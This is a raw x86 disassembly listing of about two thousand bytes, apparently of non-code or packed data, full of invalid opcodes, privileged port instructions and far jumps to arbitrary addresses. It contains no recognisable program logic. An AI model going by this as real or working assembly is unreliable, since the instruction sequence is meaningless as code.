  4169d8:	xor    BYTE PTR [esi-0x67d4ba18],bh
  4169de:	neg    BYTE PTR [edx-0xb]
  4169e1:	(bad)  
  4169e2:	iret   
  4169e3:	xchg   ecx,eax
  4169e4:	mov    ecx,0x9e332d73
  4169e9:	retf   
  4169ea:	cmp    eax,0xe89abda3
  4169ef:	add    esp,DWORD PTR [edx+0x500d32c6]
  4169f5:	push   es
  4169f6:	cmp    BYTE PTR [ecx+edx*2],dh
  4169f9:	cmp    ah,dl
  4169fb:	mov    WORD PTR [esi+ebp*8-0x7b59cabf],es
  416a02:	jle    0x41698c
  416a04:	jmp    0x4169a8
  416a06:	add    BYTE PTR [eax],ah
  416a08:	and    dh,BYTE PTR [ebp+0x10]
  416a0b:	cmc    
  416a0c:	or     DWORD PTR ds:0x223ae8e9,esp
  416a12:	cli    
  416a13:	repz push esp
  416a15:	cmp    esp,DWORD PTR [ebx+esi*4+0x528903f5]
  416a1c:	add    dh,BYTE PTR [edi-0x49]
  416a1f:	in     eax,dx
  416a20:	inc    ebp
  416a21:	fs inc edx
  416a23:	sub    DWORD PTR [eax],eax
  416a25:	(bad)  
  416a26:	scas   eax,DWORD PTR es:[edi]
  416a27:	repnz push eax
  416a29:	fwait
  416a2a:	dec    eax
  416a2b:	jnp    0x4169c2
  416a2d:	leave  
  416a2e:	adc    al,0xf4
  416a30:	call   0x81db55c4
  416a35:	lds    ebp,FWORD PTR [esi+ecx*1-0x3156d3ce]
  416a3c:	scas   eax,DWORD PTR es:[edi]
  416a3d:	ret    0x7136
  416a40:	test   eax,0xd3d3db58
  416a45:	mov    fs,WORD PTR ds:0x3805c222
  416a4b:	cmp    DWORD PTR [edx],edx
  416a4d:	ficomp WORD PTR [eax]
  416a4f:	(bad)  
  416a50:	push   DWORD PTR [esi+0x73]
  416a53:	(bad)  
  416a54:	push   eax
  416a55:	cmp    bl,BYTE PTR [ebp-0x34a500ef]
  416a5b:	dec    ecx
  416a5c:	mov    edi,0x6e9bf20e
  416a61:	popa   
  416a62:	jnp    0x416a30
  416a64:	adc    DWORD PTR [ebp-0x1ca11001],ebp
  416a6a:	sbb    bl,BYTE PTR [ecx+0x2c4bc7c6]
  416a70:	test   DWORD PTR ds:0xb196a893,0x64794db5
  416a7a:	mov    WORD PTR [edx-0x52],cs
  416a7d:	out    dx,al
  416a7e:	dec    ecx
  416a7f:	lahf   
  416a80:	adc    DWORD PTR [esi+0x52b6c0b],esp
  416a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a87:	das    
  416a88:	inc    esp
  416a89:	hlt    
  416a8a:	stos   BYTE PTR es:[edi],al
  416a8b:	jmp    0x2228:0xc909c9fd
  416a92:	imul   ecx,DWORD PTR [edx],0x28b3a23
  416a98:	shl    DWORD PTR [edx+edi*2-0x9bb9e8f],1
  416a9f:	aas    
  416aa0:	add    al,0xc9
  416aa2:	cs mov edi,0xc5d591fc
  416aa8:	jb     0x416afe
  416aaa:	mov    ah,0xeb
  416aac:	out    0xed,al
  416aae:	loop   0x416a33
  416ab0:	jp     0x416ab0
  416ab2:	inc    edi
  416ab3:	in     al,0x57
  416ab5:	jne    0x416a89
  416ab7:	add    DWORD PTR [edi+0x29],ebx
  416aba:	or     DWORD PTR [eax],esp
  416abc:	add    BYTE PTR [esi-0x143b2594],0x57
  416ac3:	mov    BYTE PTR [ecx+0x3d201e00],dl
  416ac9:	push   edi
  416aca:	push   ebp
  416acb:	ret    0x43f6
  416ace:	shl    BYTE PTR [edx],1
  416ad0:	stc    
  416ad1:	mov    esp,0x5d1d6328
  416ad6:	mov    WORD PTR [esi+0x11],es
  416ad9:	in     al,0x23
  416adb:	(bad)  
  416adc:	xchg   edi,eax
  416add:	ror    DWORD PTR [edx-0x72],1
  416ae0:	je     0x416a9f
  416ae2:	fwait
  416ae3:	xor    al,ch
  416ae5:	adc    esp,DWORD PTR [ecx]
  416ae7:	scas   eax,DWORD PTR es:[edi]
  416ae8:	jns    0x416b29
  416aea:	jae    0x416b04
  416aec:	stos   DWORD PTR es:[edi],eax
  416aed:	ficom  WORD PTR [eax]
  416aef:	std    
  416af0:	xor    cl,BYTE PTR [edx-0x47effb33]
  416af6:	sub    al,0x27
  416af8:	sbb    BYTE PTR [ebp-0x5f3eba06],ah
  416afe:	dec    eax
  416aff:	xor    BYTE PTR [edx],al
  416b01:	xchg   edx,eax
  416b02:	or     al,0x6c
  416b04:	inc    eax
  416b06:	scas   eax,DWORD PTR es:[edi]
  416b07:	lods   eax,DWORD PTR ds:[esi]
  416b08:	mov    WORD PTR [esi+0x2],ss
  416b0b:	mov    bh,0x76
  416b0d:	mov    eax,0xb3e5e56f
  416b12:	das    
  416b13:	fisubr DWORD PTR ds:0x258d9a5f
  416b19:	push   edi
  416b1a:	mov    al,ds:0x7ecccd93
  416b1f:	or     DWORD PTR [ebx-0x7a],eax
  416b22:	mov    bl,0x5a
  416b24:	imul   edi,eax,0x61a8d893
  416b2a:	push   edx
  416b2b:	push   0x54
  416b2d:	(bad)  
  416b2e:	imul   esp,DWORD PTR [ecx-0x9],0x77
  416b32:	xchg   edx,eax
  416b33:	call   0x16352e83
  416b38:	scas   al,BYTE PTR es:[edi]
  416b39:	popa   
  416b3a:	cmp    al,0xd8
  416b3c:	pop    DWORD PTR [edx+0x71cd61b8]
  416b42:	ins    DWORD PTR es:[edi],dx
  416b43:	inc    eax
  416b44:	dec    edi
  416b45:	int    0x82
  416b47:	jle    0x416b73
  416b49:	cmp    dh,BYTE PTR [ebp-0x68340d27]
  416b4f:	imul   ebx,DWORD PTR [ebp+edx*8+0x56d347f0],0xffffffd9
  416b57:	ret    
  416b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b59:	adc    BYTE PTR [edx-0x68],al
  416b5c:	xor    BYTE PTR [ecx+0x4d],cl
  416b5f:	push   esi
  416b60:	cmp    ecx,DWORD PTR [edx]
  416b62:	dec    edi
  416b63:	add    ch,BYTE PTR ds:0x4d7572c3
  416b69:	fdiv   QWORD PTR [ebx-0x47]
  416b6c:	(bad)  
  416b6d:	jns    0x416af2
  416b6f:	jb     0x416b11
  416b71:	int3   
  416b72:	xor    eax,0x3d907669
  416b77:	dec    edx
  416b78:	ins    DWORD PTR es:[edi],dx
  416b79:	and    ebx,DWORD PTR [esi]
  416b7b:	xchg   esi,eax
  416b7c:	(bad)  
  416b7d:	fisubr WORD PTR ds:0x48b092cb
  416b83:	sbb    al,0x28
  416b85:	ret    0xdb2c
  416b88:	loopne 0x416bd2
  416b8a:	lock cmp al,0x79
  416b8d:	test   eax,0x8340f1e6
  416b92:	out    dx,eax
  416b93:	dec    ebp
  416b94:	push   edx
  416b95:	add    edi,edi
  416b97:	mov    dl,0xa5
  416b99:	das    
  416b9a:	pop    esp
  416b9b:	leave  
  416b9c:	add    DWORD PTR [edx-0x6f],ebx
  416b9f:	imul   eax,DWORD PTR [edi-0xc],0x47
  416ba3:	ins    BYTE PTR es:[edi],dx
  416ba4:	(bad)  
  416ba5:	ds cdq 
  416ba7:	idiv   bh
  416ba9:	ds dec esi
  416bab:	push   ebx
  416bac:	fnstcw WORD PTR [ebx-0x6ef093ea]
  416bb2:	inc    esi
  416bb4:	push   0x350a0626
  416bb9:	jne    0x416bb8
  416bbb:	out    dx,eax
  416bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bbd:	fs retf 0xd9a5
  416bc1:	add    al,0x1d
  416bc3:	repnz inc ebx
  416bc5:	sti    
  416bc6:	push   esp
  416bc7:	in     al,0x69
  416bc9:	pop    edi
  416bca:	cwde   
  416bcb:	xchg   esp,esp
  416bcd:	mov    ah,0x99
  416bcf:	gs lock scas eax,DWORD PTR es:[edi]
  416bd2:	ffree  st(5)
  416bd4:	xchg   edx,eax
  416bd5:	test   eax,0xa70e6c34
  416bda:	and    BYTE PTR [eax-0x7b23c7e7],al
  416be0:	jno    0x416c4d
  416be2:	jmp    0x416c63
  416be4:	lods   al,BYTE PTR ds:[esi]
  416be5:	push   es
  416be6:	jmp    0x416c0f
  416be8:	fwait
  416be9:	push   esi
  416bea:	push   esp
  416beb:	xor    ebp,DWORD PTR [ebp+0x5f]
  416bee:	pop    ds
  416bef:	or     edx,DWORD PTR [edx+edi*8]
  416bf2:	retf   
  416bf3:	jae    0x416bc3
  416bf5:	mov    al,ds:0x2a063c5b
  416bfa:	cmp    edx,DWORD PTR [eax+0x4e]
  416bfd:	or     dh,BYTE PTR [edx+0x58b1a1a]
  416c03:	ss inc eax
  416c05:	dec    eax
  416c06:	add    BYTE PTR [ebx],ah
  416c08:	cmp    ah,BYTE PTR ds:0x1032e293
  416c0e:	xor    al,0xa3
  416c10:	pop    eax
  416c11:	retf   0x616c
  416c14:	inc    ecx
  416c15:	jns    0x416b9b
  416c17:	fwait
  416c18:	cmp    eax,0xc4ec4cbf
  416c1d:	mov    ds:0x83b83daf,eax
  416c22:	divps  xmm6,xmm3
  416c25:	push   ebp
  416c26:	scas   eax,DWORD PTR es:[edi]
  416c27:	sbb    BYTE PTR [edi+edx*4-0x25],0x35
  416c2c:	lds    esp,FWORD PTR [ecx+0x1679303f]
  416c32:	das    
  416c33:	jle    0x416c56
  416c35:	xlat   BYTE PTR ds:[ebx]
  416c36:	(bad)  
  416c37:	iret   
  416c38:	dec    edi
  416c39:	add    al,0x55
  416c3b:	inc    BYTE PTR [edx+0x62]
  416c3e:	mov    eax,ds:0x33cc059f
  416c43:	sbb    al,0xf1
  416c45:	fs or  al,al
  416c48:	hlt    
  416c49:	(bad)  [esi]
  416c4b:	fadd   QWORD PTR ds:0xcad6c0cc
  416c51:	retf   0x7063
  416c54:	and    al,0x6f
  416c56:	pop    eax
  416c57:	fxch   st(1)
  416c59:	test   BYTE PTR [ecx],bh
  416c5b:	std    
  416c5c:	in     eax,dx
  416c5d:	jp     0x416c83
  416c5f:	fidiv  WORD PTR ds:0x6448f335
  416c65:	add    dh,BYTE PTR [ebx+0x1d03be09]
  416c6b:	test   al,0x79
  416c6d:	lods   eax,DWORD PTR ds:[esi]
  416c6e:	or     ebx,DWORD PTR [eax+0x3a9eb9e7]
  416c74:	loope  0x416c72
  416c76:	cmp    BYTE PTR [eax+0x5d625c99],ch
  416c7c:	push   ds
  416c7d:	out    0x6f,al
  416c7f:	adc    dh,BYTE PTR ds:0x8785dd8d
  416c85:	xor    DWORD PTR [eax-0x50],ebx
  416c88:	scas   eax,DWORD PTR es:[edi]
  416c89:	and    al,0xc4
  416c8b:	arpl   WORD PTR [ebp+0x62dfa2ff],dx
  416c91:	js     0x416cbe
  416c93:	repz jecxz 0x416ced
  416c96:	stc    
  416c97:	mov    ebx,0xe353d02b
  416c9c:	cmp    al,0x21
  416c9e:	jp     0x416d1b
  416ca0:	out    dx,eax
  416ca1:	and    esi,eax
  416ca3:	jecxz  0x416ccc
  416ca5:	pop    es
  416ca6:	es jecxz 0x416cab
  416ca9:	test   BYTE PTR [ebx],dh
  416cab:	adc    eax,0x2aa59d50
  416cb0:	je     0x416cd9
  416cb2:	or     ah,0x19
  416cb5:	sub    eax,0xc1252da0
  416cba:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cbd:	push   DWORD PTR [ebp+0x29]
  416cc0:	addr16 repnz sbb dl,dl
  416cc4:	aad    0x7f
  416cc6:	stc    
  416cc7:	push   0x19
  416cc9:	or     eax,0x67589da5
  416cce:	ret    0x1f10
  416cd1:	mov    dl,BYTE PTR [esi-0x60]
  416cd4:	inc    ecx
  416cd5:	pop    edi
  416cd6:	jno    0x416cd9
  416cd8:	addr16 dec eax
  416cda:	mov    es,WORD PTR [edx-0x6b]
  416cdd:	lock and dl,dl
  416ce0:	push   ecx
  416ce1:	dec    edi
  416ce2:	mov    ebx,0x8f84cf9f
  416ce7:	adc    DWORD PTR [ebx+0x3d],0x9946ee44
  416cee:	jbe    0x416d11
  416cf0:	sbb    eax,0x8f1a3038
  416cf5:	inc    eax
  416cf6:	out    dx,al
  416cf7:	pop    ecx
  416cf8:	daa    
  416cf9:	cwde   
  416cfa:	pusha  
  416cfb:	dec    edi
  416cfc:	mov    WORD PTR [ecx],gs
  416cfe:	pop    esi
  416cff:	cmp    al,0x4f
  416d01:	repz mov bl,BYTE PTR [edi]
  416d04:	retf   0xffa4
  416d07:	push   cs
  416d08:	arpl   WORD PTR [eax],sp
  416d0a:	arpl   WORD PTR [edx],cx
  416d0c:	jl     0x416d19
  416d0e:	scas   al,BYTE PTR es:[edi]
  416d0f:	clc    
  416d10:	xor    eax,0xa62b0735
  416d15:	add    DWORD PTR [edi],ecx
  416d17:	retf   0xa8b1
  416d1a:	mov    eax,ds:0x90fe7e9f
  416d1f:	lock dec edi
  416d21:	sbb    ch,bl
  416d23:	mov    esp,0xe46f6cf1
  416d28:	rcl    DWORD PTR [ecx+0x24],0x78
  416d2c:	add    eax,ebx
  416d2e:	inc    esp
  416d2f:	ficom  WORD PTR [ebx]
  416d31:	lods   eax,DWORD PTR ds:[esi]
  416d32:	dec    ecx
  416d33:	ins    DWORD PTR es:[edi],dx
  416d34:	out    dx,al
  416d35:	jae    0x416ccc
  416d37:	mov    esp,DWORD PTR [esi-0x60bebc19]
  416d3d:	nop
  416d3e:	fistp  QWORD PTR [esi]
  416d40:	add    BYTE PTR [edi-0x2f],0x71
  416d44:	sub    DWORD PTR [ebp+0xe],ecx
  416d47:	sbb    BYTE PTR [ebx],0x18
  416d4a:	cdq    
  416d4b:	pop    ecx
  416d4c:	adc    edi,edi
  416d4e:	pop    esp
  416d4f:	inc    eax
  416d50:	push   edx
  416d51:	xor    DWORD PTR [edx],edx
  416d53:	jno    0x416d8c
  416d55:	push   eax
  416d56:	stos   BYTE PTR es:[edi],al
  416d57:	fst    DWORD PTR [esi-0x516c73d5]
  416d5d:	jl     0x416cf3
  416d5f:	adc    DWORD PTR [ecx],edi
  416d61:	aas    
  416d62:	in     eax,0xcc
  416d64:	inc    eax
  416d65:	sti    
  416d66:	or     al,0xec
  416d68:	ss dec eax
  416d6a:	imul   edx,DWORD PTR [edx-0x684b7856],0xffffffb6
  416d71:	shl    ebp,cl
  416d73:	or     al,0x2b
  416d75:	lahf   
  416d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d77:	lahf   
  416d78:	stc    
  416d79:	aam    0x64
  416d7b:	jno    0x416d7b
  416d7d:	arpl   WORD PTR [ecx+ecx*4-0x76004c8],sp
  416d84:	add    cl,BYTE PTR ds:0x4f085395
  416d8a:	repz sub DWORD PTR [edx+0x5d],esi
  416d8e:	fisubr WORD PTR [esi-0x497d23bf]
  416d94:	aas    
  416d95:	pushf  
  416d96:	xchg   esi,eax
  416d97:	scas   eax,DWORD PTR es:[edi]
  416d98:	clc    
  416d99:	pop    edi
  416d9a:	push   esi
  416d9b:	div    DWORD PTR [esi]
  416d9d:	popf   
  416d9e:	adc    BYTE PTR [di+0x29],0xe3
  416da3:	and    al,0xdc
  416da5:	retf   0x7548
  416da8:	lea    ecx,[esi-0x64]
  416dab:	out    dx,al
  416dac:	sbb    ah,al
  416dae:	xlat   BYTE PTR ds:[ebx]
  416daf:	adc    bh,ch
  416db1:	sbb    DWORD PTR [edi+0x42930710],ecx
  416db7:	in     al,0x91
  416db9:	dec    esp
  416dba:	jle    0x416dc2
  416dbc:	or     al,0xab
  416dbe:	stc    
  416dbf:	cmp    BYTE PTR [edi-0x2224e3],0xfb
  416dc6:	xor    BYTE PTR [ecx],ch
  416dc8:	es mov ebp,0x4f489334
  416dce:	les    edi,FWORD PTR [ebx-0x80]
  416dd1:	mov    ecx,DWORD PTR [eax]
  416dd3:	mov    ds:0x2d06476e,eax
  416dd8:	retf   
  416dd9:	rol    DWORD PTR [eax+ebx*8+0x2d],0x7
  416dde:	and    eax,0x897adcec
  416de3:	sbb    edx,DWORD PTR [eax+0x77]
  416de6:	xchg   ebx,eax
  416de7:	hlt    
  416de8:	retf   
  416de9:	enter  0xf240,0x9a
  416ded:	mov    cl,0x74
  416def:	inc    edx
  416df0:	mov    esi,0x2385c57b
  416df5:	xchg   esi,eax
  416df6:	and    edx,DWORD PTR [esp+ebx*4]
  416df9:	(bad)  
  416dfb:	jne    0x416de4
  416dfd:	inc    ecx
  416dfe:	icebp  
  416dff:	in     al,0x2c
  416e01:	cmc    
  416e02:	cs push edi
  416e04:	sub    esp,esi
  416e06:	les    esi,FWORD PTR [ecx+eax*2+0x499411d4]
  416e0d:	mov    bh,BYTE PTR [ebx-0x3987ccb1]
  416e13:	mov    cl,bh
  416e15:	xchg   ebp,eax
  416e16:	fsub   DWORD PTR [ebx]
  416e18:	sub    edx,DWORD PTR [ecx+0x43]
  416e1b:	pop    eax
  416e1c:	dec    esi
  416e1d:	jg     0x416e56
  416e1f:	sub    al,0x0
  416e21:	add    BYTE PTR [eax],al
  416e23:	add    BYTE PTR [eax],al
  416e25:	add    BYTE PTR [esi-0x9b72fa0],al
  416e2b:	clc    
  416e2c:	sahf   
  416e2d:	out    dx,al
  416e2e:	or     eax,0x46b0d536
  416e33:	repnz or BYTE PTR [edi+eax*1],dh
  416e37:	imul   eax,DWORD PTR [ecx],0x72200
  416e3d:	add    BYTE PTR [edx+0x44],ch
  416e40:	das    
  416e41:	rcl    BYTE PTR [edx-0x1044a159],0x1c
  416e48:	mov    edi,0x42add46d
  416e4d:	test   DWORD PTR ds:0xbdcf0add,ebp
  416e53:	mov    dh,0x4c
  416e55:	inc    esi
  416e56:	cs adc al,0x79
  416e59:	outs   dx,BYTE PTR ds:[esi]
  416e5a:	pop    esp
  416e5b:	mov    ebp,0x5017d6d6
  416e60:	ret    0xbb0
  416e63:	xor    eax,0x17f10782
  416e68:	popa   
  416e69:	(bad)  
  416e6a:	xor    DWORD PTR [eax-0x3f724cb5],ecx
  416e70:	loope  0x416ebc
  416e72:	scas   al,BYTE PTR es:[edi]
  416e73:	(bad)
  416e78:	sub    eax,ebp
  416e7a:	aas    
  416e7b:	xchg   ebx,eax
  416e7c:	pop    edx
  416e7d:	adc    BYTE PTR [esp+eiz*8],cl
  416e80:	in     eax,0x16
  416e82:	(bad)  
  416e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e84:	pop    ss
  416e85:	lods   eax,DWORD PTR ds:[esi]
  416e86:	retf   
  416e87:	push   ecx
  416e88:	sbb    dh,BYTE PTR [edi-0x5dfc4a6f]
  416e8e:	inc    ebx
  416e8f:	fs pushf 
  416e91:	or     BYTE PTR [esi+0xc56e0ff],0x80
  416e98:	loope  0x416ea1
  416e9a:	hlt    
  416e9b:	jl     0x416e78
  416e9d:	call   0x9d34:0x29e36672
  416ea4:	es hlt 
  416ea6:	mov    ah,0xf0
  416ea8:	dec    esi
  416ea9:	aad    0xeb
  416eab:	mov    ds:0x2a36fabd,al
  416eb0:	out    0x30,al
  416eb2:	jb     0x416e86
  416eb4:	sbb    ebp,edx
  416eb6:	test   eax,0x583193b5
  416ebb:	jl     0x416e3f
  416ebd:	sbb    eax,0x4db6b0df
  416ec2:	leave  
  416ec3:	and    bh,BYTE PTR [ebp+edi*4+0x61]
  416ec7:	sti    
  416ec8:	stos   DWORD PTR es:[edi],eax
  416ec9:	push   ss
  416eca:	mov    ds:0x93113a92,eax
  416ecf:	push   cs
  416ed0:	(bad)  
  416ed1:	call   0x1326e7a1
  416ed6:	gs jl  0x416f01
  416ed9:	cmp    esp,DWORD PTR [esi]
  416edb:	es add esi,edx
  416ede:	js     0x416eea
  416ee0:	cmp    DWORD PTR [ebx+0x9],esp
  416ee3:	imul   ecx,DWORD PTR [edx],0xffffffa6
  416ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee7:	pop    ebx
  416ee8:	mov    cl,0x35
  416eea:	popa   
  416eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eec:	rol    BYTE PTR [ebx+ebp*1],cl
  416eef:	push   ecx
  416ef0:	inc    ebx
  416ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ef2:	pop    eax
  416ef3:	pop    esi
  416ef4:	test   al,0xb6
  416ef6:	leave  
  416ef7:	ret    0x1e68
  416efa:	dec    edx
  416efb:	out    dx,al
  416efc:	cmp    eax,0x57ce1d32
  416f01:	out    dx,al
  416f02:	push   es
  416f03:	sub    DWORD PTR [ebx+0x46de2f07],ecx
  416f09:	(bad)  
  416f0a:	pop    ss
  416f0b:	repnz sar BYTE PTR [ebp+0x599d84a3],0xe7
  416f13:	lahf   
  416f14:	aad    0x5a
  416f16:	and    eax,0xc876e72a
  416f1b:	cmova  ebx,DWORD PTR [ebx+0x2edcd139]
  416f22:	out    dx,eax
  416f23:	hlt    
  416f24:	fdiv   st,st(5)
  416f26:	xchg   ecx,eax
  416f27:	inc    ebx
  416f28:	call   0xcaf70ef9
  416f2d:	xlat   BYTE PTR ds:[ebx]
  416f2e:	repnz aad 0xbf
  416f31:	mov    edx,0x73b8bb65
  416f36:	inc    esi
  416f37:	out    0xd4,al
  416f39:	cmp    DWORD PTR [ebp-0x3a0c759d],0xcb837ebc
  416f43:	aaa    
  416f44:	or     bl,dl
  416f46:	jno    0x416f86
  416f48:	iret   
  416f49:	xor    BYTE PTR [ecx-0x2a],dl
  416f4c:	(bad)  
  416f4e:	sub    DWORD PTR [edx],edx
  416f50:	(bad)  
  416f51:	aaa    
  416f52:	adc    al,0x1d
  416f54:	add    ebx,DWORD PTR [edi]
  416f56:	sbb    BYTE PTR [edi+0x107e531a],ch
  416f5c:	pop    esp
  416f5d:	ins    BYTE PTR es:[edi],dx
  416f5e:	std    
  416f5f:	mov    dh,0xff
  416f61:	fnstenv [edx]
  416f63:	mov    cl,0x6b
  416f65:	sar    edi,1
  416f67:	(bad)  
  416f68:	call   0x9ce2:0x155e9e05
  416f6f:	das    
  416f70:	and    DWORD PTR [edi],ecx
  416f72:	arpl   si,si
  416f74:	(bad)  
  416f75:	jle    0x416fb2
  416f77:	mov    dh,0x9f
  416f79:	push   cs
  416f7a:	fild   DWORD PTR [esi]
  416f7c:	adc    ch,BYTE PTR [edi-0x3c11b2c]
  416f82:	jp     0x416f98
  416f84:	jle    0x416fa7
  416f86:	ss jle 0x416ff5
  416f89:	xor    DWORD PTR [edx+esi*2+0x4a],ebx
  416f8d:	mov    esi,0x2cafb065
  416f92:	push   ebx
  416f93:	not    BYTE PTR [ebx+edi*4]
  416f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f97:	pop    es
  416f98:	loop   0x416f8c
  416f9a:	mov    ecx,0xfa4adb9a
  416f9f:	push   ebp
  416fa0:	gs popa 
  416fa2:	adc    esi,ecx
  416fa4:	xor    BYTE PTR [eiz*4+0x3d0fea6e],al
  416fab:	inc    eax
  416fac:	es mov ah,0x39
  416faf:	and    BYTE PTR [eax-0x7d],ch
  416fb2:	cmp    eax,0x2a40516e
  416fb7:	test   eax,0x3f01f294
  416fbc:	jp     0x417025
  416fbe:	cli    
  416fbf:	(bad)  
  416fc0:	fs cdq 
  416fc2:	mov    al,0xf2
  416fc4:	sub    ecx,0xbb97ec21
  416fca:	fimul  WORD PTR [edi+eax*2+0x3c]
  416fce:	cmp    al,BYTE PTR [esp+eiz*8-0x7d61335c]
  416fd5:	mov    al,ds:0x5b58a404
  416fda:	and    BYTE PTR [edi],0x15
  416fdd:	jbe    0x41705d
  416fdf:	ja     0x416fc6
  416fe1:	inc    ebx
  416fe2:	sbb    DWORD PTR [edx+0x50],esp
  416fe5:	adc    BYTE PTR [ebx*2+0x62957d2],ch
  416fec:	mov    ebx,0xc2a8cc3a
  416ff1:	and    ecx,ecx
  416ff3:	out    0xef,eax
  416ff5:	das    
  416ff6:	cld    
  416ff7:	xchg   BYTE PTR [esi+0x47],bh
  416ffa:	jmp    0x6435:0xbc487b97
  417001:	lock call 0x176f:0x198ee95e
  417009:	xor    al,0xb0
  41700b:	(bad)  
  41700d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41700e:	(bad)  
  41700f:	bound  edi,QWORD PTR [esi-0xa]
  417012:	into   
  417013:	and    esp,ebp
  417015:	ins    DWORD PTR es:[edi],dx
  417016:	inc    ebp
  417017:	hlt    
  417018:	jb     0x416fac
  41701a:	jg     0x417052
  41701c:	aad    0x8f
  41701e:	inc    eax
  41701f:	xor    al,BYTE PTR ds:0x3de2bfee
  417025:	xor    esi,ebx
  417027:	cmp    eax,0xc20b8482
  41702c:	retf   0x321c
  41702f:	push   ss
  417030:	stc    
  417031:	(bad)  
  417032:	inc    dh
  417034:	pop    esp
  417035:	stos   DWORD PTR es:[edi],eax
  417036:	mov    WORD PTR [ebp+0x12],cs
  417039:	adc    DWORD PTR [edx-0x7],ebx
  41703c:	jbe    0x417061
  41703e:	adc    DWORD PTR [ebx-0x45302db6],ebx
  417044:	iret   
  417045:	mov    edi,0x4ae4b5e0
  41704a:	mov    bh,BYTE PTR [edi+0x6c]
  41704d:	push   esi
  41704e:	lea    esi,[edx+0x19910694]
  417054:	imul   ebx,esp,0x46a5442b
  41705a:	jo     0x417061
  41705c:	dec    esp
  41705d:	pop    ds
  41705e:	idiv   DWORD PTR [edx+0x3b00ca02]
  417064:	push   eax
  417065:	mov    BYTE PTR [ebx],bh
  417067:	cmp    DWORD PTR [ecx+0x4e],0x23
  41706b:	inc    ecx
  41706c:	mov    WORD PTR [ebx+0x53],fs
  41706f:	add    esi,DWORD PTR [edx]
  417071:	(bad)  
  417072:	loop   0x416fff
  417074:	inc    esp
  417075:	add    eax,0x5f80f7da
  41707a:	js     0x417009
  41707c:	test   DWORD PTR [eax+0x9],esi
  41707f:	aad    0x40
  417081:	jp     0x41701d
  417083:	stc    
  417084:	or     eax,0xa7c02759
  417089:	push   cs
  41708a:	scas   eax,DWORD PTR es:[edi]
  41708b:	add    al,0x89
  41708d:	or     DWORD PTR [edx+ebp*8-0x12],ebp
  417091:	and    dh,ch
  417093:	hlt    
  417094:	push   ecx
  417095:	and    BYTE PTR [ecx*4+0x465ac378],0xcb
  41709d:	hlt    
  41709e:	jg     0x4170cd
  4170a0:	cwde   
  4170a1:	das    
  4170a2:	cld    
  4170a3:	fisub  WORD PTR [esi+edx*4+0x83ee428]
  4170aa:	push   edx
  4170ab:	add    BYTE PTR [edi+0x40],al
  4170ae:	inc    edx
  4170af:	out    dx,al
  4170b0:	idiv   ah
  4170b2:	sbb    al,0x22
  4170b4:	ins    BYTE PTR es:[edi],dx
  4170b5:	xor    al,BYTE PTR [eax-0xb]
  4170b8:	lahf   
  4170b9:	sbb    esi,DWORD PTR [ecx]
  4170bb:	in     al,0x13
  4170bd:	pop    esp
  4170be:	mov    esi,?
  4170c0:	lahf   
  4170c1:	sub    al,0x29
  4170c3:	data16 mov al,0x21
  4170c6:	push   esp
  4170c7:	xchg   BYTE PTR [edi-0x6f],dh
  4170ca:	sub    DWORD PTR [edx],ebx
  4170cc:	sbb    al,0x78
  4170ce:	lock in al,dx
  4170d0:	jmp    0xb36b:0xb84a8316
  4170d7:	mov    eax,ds:0x6420b4ff
  4170dc:	cs xchg esi,eax
  4170de:	pop    ebp
  4170df:	call   0x55c4:0x3e5b1822
  4170e6:	clc    
  4170e7:	aaa    
  4170e8:	test   esi,edi
  4170ea:	dec    esp
  4170eb:	int    0xd2
  4170ed:	in     eax,0xc7
  4170ef:	or     DWORD PTR [ebx],edx
  4170f1:	sbb    cl,bh
  4170f3:	mov    ebp,0x329c7907
  4170f8:	mov    eax,0x7e033e7f
  4170fd:	cmp    ebp,DWORD PTR ds:[edx-0x24]
  417101:	sub    ebp,DWORD PTR ds:0x476442e3
  417107:	adc    eax,0x9d80a250
  41710c:	jmp    0x76c6:0xd3efff9b
  417113:	ds das 
  417115:	in     eax,dx
  417116:	sar    esp,cl
  417118:	(bad)  
  417119:	jp     0x4170c6
  41711b:	scas   al,BYTE PTR es:[edi]
  41711c:	dec    ecx
  41711d:	shl    BYTE PTR [edx+0x7c28315c],0xb0
  417124:	jbe    0x417199
  417126:	xor    edx,DWORD PTR [ecx+eax*1]
  417129:	xchg   BYTE PTR [ebp+0x67],ah
  41712c:	test   al,0x99
  41712e:	xor    eax,0xf86e471b
  417133:	jb     0x417127
  417135:	iret   
  417136:	pop    ebp
  417137:	loop   0x4170e3
  417139:	add    cl,ch
  41713b:	lahf   
  41713c:	icebp  
  41713d:	stc    
  41713e:	mov    BYTE PTR [esp+ecx*2],dl
  417141:	loop   0x417154
  417143:	call   0x30bc24c1
  417148:	imul   ebx,DWORD PTR [eax-0x3b],0x72
  41714c:	icebp  
  41714d:	dec    eax
  41714e:	gs (bad) 
  417150:	xchg   ebp,eax
  417151:	ret    
  417152:	popa   
  417153:	pop    eax
  417154:	mov    esi,0xdb09908a
  417159:	push   cx
  41715b:	xchg   edx,eax
  41715c:	jb     0x4170eb
  41715e:	clc    
  41715f:	dec    DWORD PTR [ebp-0x6b]
  417162:	mov    eax,DWORD PTR [edx]
  417164:	dec    edx
  417165:	(bad)  [ebx-0x3b7d64a4]
  41716b:	push   0xabf5cc56
  417170:	jge    0x417125
  417172:	xchg   esp,eax
  417173:	mov    cl,0x67
  417175:	int    0xf6
  417177:	retf   
  417178:	scas   eax,DWORD PTR es:[edi]
  417179:	adc    DWORD PTR gs:[ebx],esp
  41717c:	cs jg  0x4171ee
  41717f:	cs ins BYTE PTR es:[edi],dx
  417181:	pop    esi
  417182:	scas   eax,DWORD PTR es:[edi]
  417183:	cwde   
  417184:	jmp    0x4171fe
  417186:	mov    edx,0xfdc88478
  41718b:	cmp    al,dl
  41718d:	cmp    esi,DWORD PTR [ebx+edi*8-0x44]
